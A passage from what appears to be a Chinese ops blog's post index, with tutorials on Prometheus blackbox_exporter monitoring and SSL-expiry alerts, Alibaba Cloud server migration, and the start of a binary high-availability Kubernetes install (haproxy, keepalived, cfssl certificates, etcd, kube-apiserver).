“ip4” 可以检测cf代理目标在 cloudflare 后面，状态码非200 docker直接运行1sudo docker run -d --restart=always --name blackbox-exporter -p 9115:9115 -v /data/blackbox_exporter:/etc/blackbox_exporter prom/blackbox-exporter:v0.19.0 --config.file=/etc/blackbox_exporter/config.yml docker-compose方式为了方便省事，我mongodb用的管理员账号，生产不建议使用 1234567891011121314cd /data/blackbox_exporter/cat &gt;docker-compose.yaml &lt;&lt;&quot;EOF&quot;version: '3.3'services: blackbox_exporter: image: prom/blackbox-exporter container_name: blackbox_exporter restart: always volumes: - /data/blackbox_exporter:/etc/blackbox_exporter ports: - 9115:9115EOF 启动 1docker-compose up -d 检查 123docker ps或：docker logs -f blackbox_exporter 3、参数解释1--config.file #指定配置文件路径 4、metrics地址 名称 地址 备注 blackbox_exporter http://192.168.224.12:9115/metrics 5、Prometheus配置配置prometheus去采集（拉取）blackbox_exporter的监控样本数据 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cd /data/docker-prometheus cat &gt;&gt; prometheus/prometheus.yml &lt;&lt;&quot;EOF&quot;#http配置 - job_name: &quot;blackbox_http&quot; metrics_path: /probe params: module: [http_2xx] static_configs: - targets: - https://www.baidu.com - https://www.jd.com relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115#tcp检查配置 - job_name: &quot;blackbox_tcp&quot; metrics_path: /probe params: module: [tcp_connect] static_configs: - targets: - 192.168.224.11:22 - 192.168.224.11:9090 relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115#icmp检查配置 ping - job_name: &quot;blackbox_icmp&quot; metrics_path: /probe params: module: [icmp] static_configs: - targets: - 192.168.224.11 - 192.168.224.12 relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查12345http://192.168.224.12:9115/probe?target=https://www.baidu.com&amp;module=http_2xxhttp://192.168.224.12:9115http://192.168.224.11:9090/targets?search= 监控项1234567891011121314151617probe_probe_success # 是否探测成功（取值 1、0 分别表示成功、失败）probe_duration_seconds # 探测的耗时# 关于 DNSprobe_dns_lookup_time_seconds # DNS 解析的耗时probe_ip_protocol # IP 协议，取值为 4、6probe_ip_addr_hash # IP 地址的哈希值，用于判断 IP 是否变化# 关于 HTTPprobe_http_status_code # HTTP 响应的状态码。如果发生重定向，则取决于最后一次响应probe_http_content_length # HTTP 响应的 body 长度，单位 bytesprobe_http_version # HTTP 响应的协议版本，比如 1.1probe_http_ssl # HTTP 响应是否采用 SSL ，取值为 1、0probe_ssl_earliest_cert_expiry # SSL 证书的过期时间，为 Unix 时间戳 触发器配置Prometheus配置 1234# 报警(触发器)配置rule_files: - &quot;alert.yml&quot; - &quot;rules/*.yml&quot; 添加blackbox_exporter触发器（告警规则）1cd /data/docker-prometheus 使用cat创建文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cat &gt;&gt; prometheus/rules/blackbox_exporter.yml &lt;&lt;&quot;EOF&quot;groups:- name: Blackbox rules: - alert: 黑盒子探测失败告警 expr: probe_success == 0 for: 1m labels: severity: critical annotations: summary: &quot;黑盒子探测失败{{ $labels.instance }}&quot; description: &quot;黑盒子检测失败，当前值：{{ $value }}&quot; - alert: 请求慢告警 expr: avg_over_time(probe_duration_seconds[1m]) &gt; 1 for: 1m labels: severity: warning annotations: summary: &quot;请求慢{{ $labels.instance }}&quot; description: &quot;请求时间超过1秒，值为：{{ $value }}&quot; - alert: http状态码检测失败 expr: probe_http_status_code &lt;= 199 OR probe_http_status_code &gt;= 400 for: 1m labels: severity: critical annotations: summary: &quot;http状态码检测失败{{ $labels.instance }}&quot; description: &quot;HTTP状态码非 200-399，当前状态码为：{{ $value }}&quot; - alert: ssl证书即将到期 expr: probe_ssl_earliest_cert_expiry - time() &lt; 86400 * 30 for: 1m labels: severity: warning annotations: summary: &quot;证书即将到期{{ $labels.instance }}&quot; description: &quot;SSL 证书在 30 天后到期，值：{{ $value }}&quot; - alert: ssl证书即将到期 expr: probe_ssl_earliest_cert_expiry - time() &lt; 86400 * 3 for: 1m labels: severity: critical annotations: summary: &quot;证书即将到期{{ $labels.instance }}&quot; description: &quot;SSL 证书在 3 天后到期，值：{{ $value }}&quot; - alert: ssl证书已过期 expr: probe_ssl_earliest_cert_expiry - time() &lt;= 0 for: 1m labels: severity: critical annotations: summary: &quot;证书已过期{{ $labels.instance }}&quot; description: &quot;SSL 证书已经过期，请确认是否在使用&quot;EOF 检查： 1vim prometheus/rules/blackbox_exporter.yml 检查配置1docker exec -it prometheus promtool check config /etc/prometheus/prometheus.yml 重新加载配置1curl -X POST http://localhost:9090/-/reload 检查1234http://192.168.224.11:9090/alerts?search=或：http://192.168.224.11:9090/rules Dashboardgrafana上添加图行。图行展示黑盒监控数据 1https://grafana.com/grafana/dashboards/9965 问题 检测总耗时这个图行，名称显示异常。如下图： 解决： 检测总耗时这个图行点编辑—找到Options–把Legend里面的值从_修改为 ,如下图 其他的图行也是类似的方法。","link":"/2023/05/08/%E9%BB%91%E7%9B%92SSL%E8%AF%81%E4%B9%A6%E7%AD%89%E7%9B%91%E6%8E%A7/"},{"title":"阿里云服务器迁移","text":"阿里云服务器迁移 同地区，一，创建原有服务器快照，并创建自定义镜像，创建快照和镜像 共享镜像 账号需要添ID ，不能填用户名 二，登录新阿里云账号，创建实例 2核4G的购买服务器。选择共享镜像，或者直接点击镜像，然后现在共享镜像，进行创建实例 创建好后，就可登录服务器了。这时候服务器也有之前服务器的环境 最后，可以去原有阿里云账号，去把服务器共享的镜像取消共享了，这样也不会对现有的服务器造成影响，然后把原有的镜像删掉也没事 三, 不同地区不同账号服务器迁移， 需在原账号上先复制镜像到其他地区，然后在共享到其他阿里云账号","link":"/2020/08/05/%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%81%E7%A7%BB/"},{"title":"Kubernetes高可用集群二进制部署","text":"Kubernetes高可用集群二进制部署（Runtime Containerd）Kubernetes（简称为：k8s）是Google在2014年6月开源的一个容器集群管理系统，使用Go语言开发，用于管理云平台中多个主机上的容器化的应用，Kubernetes的目标是让部署容器化的应用简单并且高效,Kubernetes提供了资源调度、部署管理、服务发现、扩容缩容、监控，维护等一整套功能，努力成为跨主机集群的自动部署、扩展以及运行应用程序容器的平台。 它支持一系列容器工具, 包括Docker、Containerd等。 一、集群环境准备1.1 主机规划 主机IP地址 主机名 主机配置 主机角色 软件列表 192.168.224.12 k8s-master1 2C4G master kube-apiserver、kube-controller-manager、kube-scheduler、etcd、kubelet、kube-proxy、Containerd、runc 192.168.224.13 k8s-master2 2C4G master kube-apiserver、kube-controller-manager、kube-scheduler、etcd、kubelet、kube-proxy、Containerd、runc 192.168.224.14 k8s-master3 2C4G master kube-apiserver、kube-controller-manager、kube-scheduler、etcd、kubelet、kube-proxy、Containerd、runc 192.168.224.15 k8s-worker1 2C4G worker kubelet、kube-proxy、Containerd、runc 192.168.224.10 ha1 1C2G LB haproxy、keepalived 192.168.224.11 ha2 1C2G LB haproxy、keepalived 192.168.224.100 / / VIP(虚拟IP) 1.2 软件版本 软件名称 版本 备注 CentOS7 kernel版本：5.17 kubernetes v1.21.10 etcd v3.5.2 最新版本 calico v3.19.4 coredns v1.8.4 containerd 1.6.1 runc 1.1.0 haproxy 5.18 YUM源默认 keepalived 3.5 YUM源默认 1.3 网络分配 网络名称 网段 备注 Node网络 192.168.224.0/24 Service网络 10.96.0.0/16 Pod网络 10.244.0.0/16 二、集群部署2.1主机准备2.1.1 主机名设置1hostnamectl set-hostname xxx 1关于主机名参见1.1小节主机规划表 2.1.2 主机与IP地址解析12345678cat &gt;&gt; /etc/hosts &lt;&lt; EOF192.168.224.10 ha1192.168.224.11 ha2192.168.224.12 k8s-master1192.168.224.13 k8s-master2192.168.224.14 k8s-master3192.168.224.15 k8s-worker1EOF 2.1.3 主机安全设置2.1.3.1 关闭防火墙123systemctl stop firewalldsystmctl disable firewalldfirewall-cmd --state 2.1.3.2 关闭selinux123setenforce 0sed -ri 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/configsestatus 2.1.4 交换分区设置1234swapoff -ased -ri 's/.*swap.*/#&amp;/' /etc/fstabecho \"vm.swappiness=0\" &gt;&gt; /etc/sysctl.confsysctl -p 2.1.5 主机系统时间同步123456安装软件yum -y install ntpdate制定时间同步计划任务crontab -e0 */1 * * * ntpdate time1.aliyun.com 2.1.6 主机系统优化 limit优化 1ulimit -SHn 65535 12345678cat &lt;&lt;EOF &gt;&gt; /etc/security/limits.conf* soft nofile 655360* hard nofile 131072* soft nproc 655350* hard nproc 655350* soft memlock unlimited* hard memlock unlimitedEOF 2.1.7 ipvs管理工具安装及模块加载 为集群节点安装，负载均衡节点不用安装 1yum -y install ipvsadm ipset sysstat conntrack libseccomp 1234567所有节点配置ipvs模块，在内核4.19+版本nf_conntrack_ipv4已经改为nf_conntrack， 4.18以下使用nf_conntrack_ipv4即可： modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack 12345678910111213141516171819202122232425创建 /etc/modules-load.d/ipvs.conf 并加入以下内容： cat &gt;/etc/modules-load.d/ipvs.conf &lt;&lt;EOF ip_vs ip_vs_lc ip_vs_wlc ip_vs_rr ip_vs_wrr ip_vs_lblc ip_vs_lblcr ip_vs_dh ip_vs_sh ip_vs_fo ip_vs_nq ip_vs_sed ip_vs_ftp ip_vs_sh nf_conntrack ip_tables ip_set xt_set ipt_set ipt_rpfilter ipt_REJECT ipip EOF 2.1.8 加载containerd相关内核模块1234临时加载模块modprobe overlaymodprobe br_netfilter 123456永久性加载模块cat &gt; /etc/modules-load.d/containerd.conf &lt;&lt; EOFoverlaybr_netfilterEOF 12设置为开机启动systemctl enable --now systemd-modules-load.service 2.1.9 Linux内核升级 在所有节点中安装,需要重新操作系统更换内核。 1[root@localhost ~]# yum -y install perl 1[root@localhost ~]# rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org 1[root@localhost ~]# yum -y install https://www.elrepo.org/elrepo-release-7.0-4.el7.elrepo.noarch.rpm 1[root@localhost ~]# yum --enablerepo=\"elrepo-kernel\" -y install kernel-ml.x86_64 1[root@localhost ~]# grub2-set-default 0 1[root@localhost ~]# grub2-mkconfig -o /boot/grub2/grub.cfg 2.1.10 Linux内核优化1234567891011121314151617181920212223242526cat &lt;&lt;EOF &gt; /etc/sysctl.d/k8s.confnet.ipv4.ip_forward = 1net.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1fs.may_detach_mounts = 1vm.overcommit_memory=1vm.panic_on_oom=0fs.inotify.max_user_watches=89100fs.file-max=52706963fs.nr_open=52706963net.netfilter.nf_conntrack_max=2310720net.ipv4.tcp_keepalive_time = 600net.ipv4.tcp_keepalive_probes = 3net.ipv4.tcp_keepalive_intvl =15net.ipv4.tcp_max_tw_buckets = 36000net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_max_orphans = 327680net.ipv4.tcp_orphan_retries = 3net.ipv4.tcp_syncookies = 1net.ipv4.tcp_max_syn_backlog = 16384net.ipv4.ip_conntrack_max = 131072net.ipv4.tcp_max_syn_backlog = 16384net.ipv4.tcp_timestamps = 0net.core.somaxconn = 16384EOF 1sysctl --system 12所有节点配置完内核后，重启服务器，保证重启后内核依旧加载reboot -h now 12重启后查看ipvs模块加载情况：lsmod | grep --color=auto -e ip_vs -e nf_conntrack 12重启后查看containerd相关模块加载情况：lsmod | egrep 'br_netfilter | overlay' 2.1.11 其它工具安装(选装)1yum install wget jq psmisc vim net-tools telnet yum-utils device-mapper-persistent-data lvm2 git lrzsz -y 2.2 负载均衡器准备2.2.1 安装haproxy与keepalived1yum -y install haproxy keepalived 2.2.2 HAProxy配置1234567891011121314151617181920212223242526272829303132333435363738394041cat &gt;/etc/haproxy/haproxy.cfg&lt;&lt;\"EOF\"global maxconn 2000 ulimit-n 16384 log 127.0.0.1 local0 err stats timeout 30sdefaults log global mode http option httplog timeout connect 5000 timeout client 50000 timeout server 50000 timeout http-request 15s timeout http-keep-alive 15sfrontend monitor-in bind *:33305 mode http option httplog monitor-uri /monitorfrontend k8s-master bind 0.0.0.0:6443 bind 127.0.0.1:6443 mode tcp option tcplog tcp-request inspect-delay 5s default_backend k8s-masterbackend k8s-master mode tcp option tcplog option tcp-check balance roundrobin default-server inter 10s downinter 5s rise 2 fall 2 slowstart 60s maxconn 250 maxqueue 256 weight 100 server k8s-master1 192.168.224.12:6443 check server k8s-master2 192.168.224.13:6443 check server k8s-master3 192.168.224.14:6443 checkEOF 2.2.3 KeepAlived 主从配置不一致，需要注意。 1234567891011121314151617181920212223242526272829303132333435ha1:cat &gt;/etc/keepalived/keepalived.conf&lt;&lt;\"EOF\"! Configuration File for keepalivedglobal_defs { router_id LVS_DEVELscript_user root enable_script_security}vrrp_script chk_apiserver { script \"/etc/keepalived/check_apiserver.sh\" interval 5 weight -5 fall 2 rise 1}vrrp_instance VI_1 { state MASTER interface ens33 mcast_src_ip 192.168.224.10 virtual_router_id 51 priority 100 advert_int 2 authentication { auth_type PASS auth_pass K8SHA_KA_AUTH } virtual_ipaddress { 192.168.224.100 } track_script { chk_apiserver }}EOF 1234567891011121314151617181920212223242526272829303132333435ha2:cat &gt;/etc/keepalived/keepalived.conf&lt;&lt;\"EOF\"! Configuration File for keepalivedglobal_defs { router_id LVS_DEVELscript_user root enable_script_security}vrrp_script chk_apiserver { script \"/etc/keepalived/check_apiserver.sh\" interval 5 weight -5 fall 2 rise 1}vrrp_instance VI_1 { state BACKUP interface ens33 mcast_src_ip 192.168.224.11 virtual_router_id 51 priority 99 advert_int 2 authentication { auth_type PASS auth_pass K8SHA_KA_AUTH } virtual_ipaddress { 192.168.224.100 } track_script { chk_apiserver }}EOF 2.2.4 健康检查脚本 ha1及ha2均要配置 123456789101112131415161718192021222324cat &gt; /etc/keepalived/check_apiserver.sh &lt;&lt;\"EOF\"#!/bin/basherr=0for k in $(seq 1 3)do check_code=$(pgrep haproxy) if [[ $check_code == \"\" ]]; then err=$(expr $err + 1) sleep 1 continue else err=0 break fidoneif [[ $err != \"0\" ]]; then echo \"systemctl stop keepalived\" /usr/bin/systemctl stop keepalived exit 1else exit 0fiEOF 1chmod +x /etc/keepalived/check_apiserver.sh 2.2.5 启动服务并验证123systemctl daemon-reloadsystemctl enable --now haproxysystemctl enable --now keepalived 1ip address show 2.3 配置免密登录 在k8s-master1上操作 1ssh-keygen 1234ssh-copy-id root@k8s-master1ssh-copy-id root@k8s-master2ssh-copy-id root@k8s-master3ssh-copy-id root@k8s-worker1 1ssh root@k8s-master1 2.4 部署ETCD集群部署高可用ETCD数据库集群 在k8s-master1上操作。 2.4.1 创建工作目录1mkdir -p /data/k8s-work 2.4.2 获取cfssl工具1234cd /data/k8s-workwget https://pkg.cfssl.org/R1.2/cfssl_linux-amd64wget https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64wget https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 12345说明：cfssl是使用go编写，由CloudFlare开源的一款PKI/TLS工具。主要程序有：- cfssl，是CFSSL的命令行工具- cfssljson用来从cfssl程序获取JSON输出，并将证书，密钥，CSR和bundle写入文件中。 1chmod +x cfssl* 123mv cfssl_linux-amd64 /usr/local/bin/cfsslmv cfssljson_linux-amd64 /usr/local/bin/cfssljsonmv cfssl-certinfo_linux-amd64 /usr/local/bin/cfssl-certinfo 1234# cfssl versionVersion: 1.2.0Revision: devRuntime: go1.6 2.4.3 创建CA证书2.4.3.1 配置ca证书请求文件123456789101112131415161718192021cat &gt; ca-csr.json &lt;&lt;\"EOF\"{ \"CN\": \"kubernetes\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Beijing\", \"L\": \"Beijing\", \"O\": \"kubemsb\", \"OU\": \"CN\" } ], \"ca\": { \"expiry\": \"87600h\" }}EOF 2.4.3.2 创建ca证书1cfssl gencert -initca ca-csr.json | cfssljson -bare ca 2.4.3.3 配置ca证书策略可以选择这个方式 1cfssl print-defaults config &gt; ca-config.json 或者这个 1234567891011121314151617181920cat &gt; ca-config.json &lt;&lt;\"EOF\"{ \"signing\": { \"default\": { \"expiry\": \"87600h\" }, \"profiles\": { \"kubernetes\": { \"usages\": [ \"signing\", \"key encipherment\", \"server auth\", \"client auth\" ], \"expiry\": \"87600h\" } } }}EOF 123server auth 表示client可以对使用该ca对server提供的证书进行验证client auth 表示server可以使用该ca对client提供的证书进行验证 2.4.4 创建etcd证书2.4.4.1 配置etcd请求文件12345678910111213141516171819202122cat &gt; etcd-csr.json &lt;&lt;\"EOF\"{ \"CN\": \"etcd\", \"hosts\": [ \"127.0.0.1\", \"192.168.224.12\", \"192.168.224.13\", \"192.168.224.14\" ], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [{ \"C\": \"CN\", \"ST\": \"Beijing\", \"L\": \"Beijing\", \"O\": \"kubemsb\", \"OU\": \"CN\" }]}EOF 2.4.4.2 生成etcd证书1cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes etcd-csr.json | cfssljson -bare etcd 123# ls输出ca-config.json ca.csr ca-csr.json ca-key.pem ca.pem etcd.csr etcd-csr.json etcd-key.pem etcd.pem 2.4.5 部署etcd集群2.4.5.1 下载etcd软件包 1wget https://github.com/etcd-io/etcd/releases/download/v3.5.2/etcd-v3.5.2-linux-amd64.tar.gz 2.4.5.2 安装etcd软件12tar -xvf etcd-v3.5.2-linux-amd64.tar.gzcp -p etcd-v3.5.2-linux-amd64/etcd* /usr/local/bin/ 2.4.5.3 分发etcd软件123scp etcd-v3.5.2-linux-amd64/etcd* k8s-master2:/usr/local/bin/scp etcd-v3.5.2-linux-amd64/etcd* k8s-master3:/usr/local/bin/ 2.4.5.4 创建配置文件1mkdir /etc/etcd 1234567891011121314cat &gt; /etc/etcd/etcd.conf &lt;&lt;\"EOF\"#[Member]ETCD_NAME=\"etcd1\"ETCD_DATA_DIR=\"/var/lib/etcd/default.etcd\"ETCD_LISTEN_PEER_URLS=\"https://192.168.224.12:2380\"ETCD_LISTEN_CLIENT_URLS=\"https://192.168.224.12:2379,http://127.0.0.1:2379\"#[Clustering]ETCD_INITIAL_ADVERTISE_PEER_URLS=\"https://192.168.224.12:2380\"ETCD_ADVERTISE_CLIENT_URLS=\"https://192.168.224.12:2379\"ETCD_INITIAL_CLUSTER=\"etcd1=https://192.168.224.12:2380,etcd2=https://192.168.224.13:2380,etcd3=https://192.168.224.14:2380\"ETCD_INITIAL_CLUSTER_TOKEN=\"etcd-cluster\"ETCD_INITIAL_CLUSTER_STATE=\"new\"EOF 12345678910说明：ETCD_NAME：节点名称，集群中唯一ETCD_DATA_DIR：数据目录ETCD_LISTEN_PEER_URLS：集群通信监听地址ETCD_LISTEN_CLIENT_URLS：客户端访问监听地址ETCD_INITIAL_ADVERTISE_PEER_URLS：集群通告地址ETCD_ADVERTISE_CLIENT_URLS：客户端通告地址ETCD_INITIAL_CLUSTER：集群节点地址ETCD_INITIAL_CLUSTER_TOKEN：集群TokenETCD_INITIAL_CLUSTER_STATE：加入集群的当前状态，new是新集群，existing表示加入已有集群 2.4.5.5 创建服务配置文件12mkdir -p /etc/etcd/sslmkdir -p /var/lib/etcd/default.etcd 123cd /data/k8s-workcp ca*.pem /etc/etcd/sslcp etcd*.pem /etc/etcd/ssl 123456789101112131415161718192021222324252627cat &gt; /etc/systemd/system/etcd.service &lt;&lt;\"EOF\"[Unit]Description=Etcd ServerAfter=network.targetAfter=network-online.targetWants=network-online.target[Service]Type=notifyEnvironmentFile=-/etc/etcd/etcd.confWorkingDirectory=/var/lib/etcd/ExecStart=/usr/local/bin/etcd \\ --cert-file=/etc/etcd/ssl/etcd.pem \\ --key-file=/etc/etcd/ssl/etcd-key.pem \\ --trusted-ca-file=/etc/etcd/ssl/ca.pem \\ --peer-cert-file=/etc/etcd/ssl/etcd.pem \\ --peer-key-file=/etc/etcd/ssl/etcd-key.pem \\ --peer-trusted-ca-file=/etc/etcd/ssl/ca.pem \\ --peer-client-cert-auth \\ --client-cert-authRestart=on-failureRestartSec=5LimitNOFILE=65536[Install]WantedBy=multi-user.targetEOF 2.4.5.6 同步etcd配置到集群其它master节点1234创建目录mkdir -p /etc/etcdmkdir -p /etc/etcd/sslmkdir -p /var/lib/etcd/default.etcd 12345服务配置文件,需要修改etcd节点名称及IP地址for i in k8s-master2 k8s-master3 ;\\do \\scp /etc/etcd/etcd.conf $i:/etc/etcd/ ;\\done 123456789101112131415k8s-master2:cat /etc/etcd/etcd.conf#[Member]ETCD_NAME=\"etcd2\"ETCD_DATA_DIR=\"/var/lib/etcd/default.etcd\"ETCD_LISTEN_PEER_URLS=\"https://192.168.224.13:2380\"ETCD_LISTEN_CLIENT_URLS=\"https://192.168.224.13:2379,http://127.0.0.1:2379\"#[Clustering]ETCD_INITIAL_ADVERTISE_PEER_URLS=\"https://192.168.224.13:2380\"ETCD_ADVERTISE_CLIENT_URLS=\"https://192.168.224.13:2379\"ETCD_INITIAL_CLUSTER=\"etcd1=https://192.168.224.12:2380,etcd2=https://192.168.224.13:2380,etcd3=https://192.168.224.14:2380\"ETCD_INITIAL_CLUSTER_TOKEN=\"etcd-cluster\"ETCD_INITIAL_CLUSTER_STATE=\"new\" 123456789101112131415k8s-master3:cat /etc/etcd/etcd.conf#[Member]ETCD_NAME=\"etcd3\"ETCD_DATA_DIR=\"/var/lib/etcd/default.etcd\"ETCD_LISTEN_PEER_URLS=\"https://192.168.224.14:2380\"ETCD_LISTEN_CLIENT_URLS=\"https://192.168.224.14:2379,http://127.0.0.1:2379\"#[Clustering]ETCD_INITIAL_ADVERTISE_PEER_URLS=\"https://192.168.224.14:2380\"ETCD_ADVERTISE_CLIENT_URLS=\"https://192.168.224.14:2379\"ETCD_INITIAL_CLUSTER=\"etcd1=https://192.168.224.12:2380,etcd2=https://192.168.224.13:2380,etcd3=https://192.168.224.14:2380\"ETCD_INITIAL_CLUSTER_TOKEN=\"etcd-cluster\"ETCD_INITIAL_CLUSTER_STATE=\"new\" 12345证书文件for i in k8s-master2 k8s-master3 ;\\do \\scp /etc/etcd/ssl/* $i:/etc/etcd/ssl ;\\done 12345服务启动配置文件for i in k8s-master2 k8s-master3 ;\\do \\scp /etc/systemd/system/etcd.service $i:/etc/systemd/system/ ;\\done 2.4.5.7 启动etcd集群123systemctl daemon-reloadsystemctl enable --now etcd.servicesystemctl status etcd 2.4.5.8 验证集群状态1ETCDCTL_API=3 /usr/local/bin/etcdctl --write-out=table --cacert=/etc/etcd/ssl/ca.pem --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem --endpoints=https://192.168.224.12:2379,https://192.168.224.13:2379,https://192.168.224.14:2379 endpoint health 1234567+----------------------------+--------+-------------+-------+| ENDPOINT | HEALTH | TOOK | ERROR |+----------------------------+--------+-------------+-------+| https://192.168.224.14:2379 | true | 10.393062ms | || https://192.168.224.12:2379 | true | 15.70437ms | || https://192.168.224.13:2379 | true | 15.871684ms | |+----------------------------+--------+-------------+-------+ 12检查ETCD数据库性能ETCDCTL_API=3 /usr/local/bin/etcdctl --write-out=table --cacert=/etc/etcd/ssl/ca.pem --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem --endpoints=https://192.168.224.12:2379,https://192.168.224.13:2379,https://192.168.224.14:2379 check perf 1234559 / 60 Boooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooom ! 98.33%PASS: Throughput is 151 writes/sPASS: Slowest request took 0.066478sPASS: Stddev is 0.002354sPASS 1ETCDCTL_API=3 /usr/local/bin/etcdctl --write-out=table --cacert=/etc/etcd/ssl/ca.pem --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem --endpoints=https://192.168.224.12:2379,https://192.168.224.13:2379,https://192.168.224.14:2379 member list 1234567+------------------+---------+-------+----------------------------+----------------------------+------------+| ID | STATUS | NAME | PEER ADDRS | CLIENT ADDRS | IS LEARNER |+------------------+---------+-------+----------------------------+----------------------------+------------+| 9b449b0ff1d4c375 | started | etcd1 | https://192.168.224.12:2380 | https://192.168.224.12:2379 | false || d1fbb74bc6a61e5c | started | etcd2 | https://192.168.224.13:2380 | https://192.168.224.13:2379 | false || f60b205fb02fe23c | started | etcd3 | https://192.168.224.14:2380 | https://192.168.224.14:2379 | false |+------------------+---------+-------+----------------------------+----------------------------+------------+ 1ETCDCTL_API=3 /usr/local/bin/etcdctl --write-out=table --cacert=/etc/etcd/ssl/ca.pem --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem --endpoints=https://192.168.224.12:2379,https://192.168.224.13:2379,https://192.168.224.14:2379 endpoint status 1234567+----------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+| ENDPOINT | ID | VERSION | DB SIZE | IS LEADER | IS LEARNER | RAFT TERM | RAFT INDEX | RAFT APPLIED INDEX | ERRORS |+----------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+| https://192.168.224.12:2379 | 9b449b0ff1d4c375 | 3.5.2 | 24 MB | true | false | 2 | 403774 | 403774 | || https://192.168.224.13:2379 | d1fbb74bc6a61e5c | 3.5.2 | 24 MB | false | false | 2 | 403774 | 403774 | || https://192.168.224.14:2379 | f60b205fb02fe23c | 3.5.2 | 24 MB | false | false | 2 | 403774 | 403774 | |+----------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+ 2.5 Kubernetes集群部署2.5.1 Kubernetes软件包下载1234wget https://dl.k8s.io/v1.21.10/kubernetes-server-linux-amd64.tar.gz#最新v1.27.1版本wget https://dl.k8s.io/v1.27.1/kubernetes-server-linux-amd64.tar.gz 2.5.2 Kubernetes软件包安装12345tar -xvf kubernetes-server-linux-amd64.tar.gzcd kubernetes/server/bin/cp kube-apiserver kube-controller-manager kube-scheduler kubectl /usr/local/bin/ 2.5.3 Kubernetes软件分发12scp kube-apiserver kube-controller-manager kube-scheduler kubectl k8s-master2:/usr/local/bin/scp kube-apiserver kube-controller-manager kube-scheduler kubectl k8s-master3:/usr/local/bin/ 1234scp kubelet kube-proxy k8s-master1:/usr/local/binscp kubelet kube-proxy k8s-master2:/usr/local/binscp kubelet kube-proxy k8s-master3:/usr/local/binscp kubelet kube-proxy k8s-worker1:/usr/local/bin 2.5.4 在集群节点上创建目录 所有节点 123mkdir -p /etc/kubernetes/ mkdir -p /etc/kubernetes/ssl mkdir -p /var/log/kubernetes 2.5.5 部署api-server2.5.5.1 创建apiserver证书请求文件cd /data/k8s-work 12345678910111213141516171819202122232425262728293031323334353637cat &gt; kube-apiserver-csr.json &lt;&lt; \"EOF\"{\"CN\": \"kubernetes\", \"hosts\": [ \"127.0.0.1\", \"192.168.224.12\", \"192.168.224.13\", \"192.168.224.14\", \"192.168.224.15\", \"192.168.224.16\", \"192.168.224.17\", \"192.168.224.18\", \"192.168.224.19\", \"192.168.224.20\", \"192.168.224.100\", \"10.96.0.1\", \"kubernetes\", \"kubernetes.default\", \"kubernetes.default.svc\", \"kubernetes.default.svc.cluster\", \"kubernetes.default.svc.cluster.local\" ], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Beijing\", \"L\": \"Beijing\", \"O\": \"kubemsb\", \"OU\": \"CN\" } ]}EOF 123说明：如果 hosts 字段不为空则需要指定授权使用该证书的 IP（含VIP） 或域名列表。由于该证书被 集群使用，需要将节点的IP都填上，为了方便后期扩容可以多写几个预留的IP。同时还需要填写 service 网络的首个IP(一般是 kube-apiserver 指定的 service-cluster-ip-range 网段的第一个IP，如 10.96.0.1)。 2.5.5.2 生成apiserver证书及token文件1cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kube-apiserver-csr.json | cfssljson -bare kube-apiserver 123cat &gt; token.csv &lt;&lt; EOF$(head -c 16 /dev/urandom | od -An -t x | tr -d ' '),kubelet-bootstrap,10001,\"system:kubelet-bootstrap\"EOF 123说明：创建TLS机制所需TOKENTLS Bootstraping：Master apiserver启用TLS认证后，Node节点kubelet和kube-proxy与kube-apiserver进行通信，必须使用CA签发的有效证书才可以，当Node节点很多时，这种客户端证书颁发需要大量工作，同样也会增加集群扩展复杂度。为了简化流程，Kubernetes引入了TLS bootstraping机制来自动颁发客户端证书，kubelet会以一个低权限用户自动向apiserver申请证书，kubelet的证书由apiserver动态签署。所以强烈建议在Node上使用这种方式，目前主要用于kubelet，kube-proxy还是由我们统一颁发一个证书。 2.5.5.3 创建apiserver服务配置文件1234567891011121314151617181920212223242526272829303132333435363738cat &gt; /etc/kubernetes/kube-apiserver.conf &lt;&lt; \"EOF\"KUBE_APISERVER_OPTS=\"--enable-admission-plugins=NamespaceLifecycle,NodeRestriction,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota \\ --anonymous-auth=false \\ --bind-address=192.168.224.12 \\ --secure-port=6443 \\ --advertise-address=192.168.224.12 \\ --insecure-port=0 \\ --authorization-mode=Node,RBAC \\ --runtime-config=api/all=true \\ --enable-bootstrap-token-auth \\ --service-cluster-ip-range=10.96.0.0/16 \\ --token-auth-file=/etc/kubernetes/token.csv \\ --service-node-port-range=30000-32767 \\ 